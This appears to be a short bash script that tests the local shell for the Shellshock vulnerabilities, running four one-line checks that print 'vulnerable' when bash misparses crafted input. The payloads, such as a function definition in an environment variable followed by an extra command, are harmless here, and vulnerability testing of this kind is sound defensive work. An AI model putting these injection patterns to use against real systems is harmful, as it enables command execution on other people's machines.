#!/bin/bash
# Author: Prithvi Kambhampati
#1
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
#2
env X='() { (a)=>\' bash -c "echo date"; cat echo
#3
bash -c 'true <<EOF <<EOF' || echo "vulnerable"
#4
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200}; do echo done ; done) | bash || echo "vulnerable"
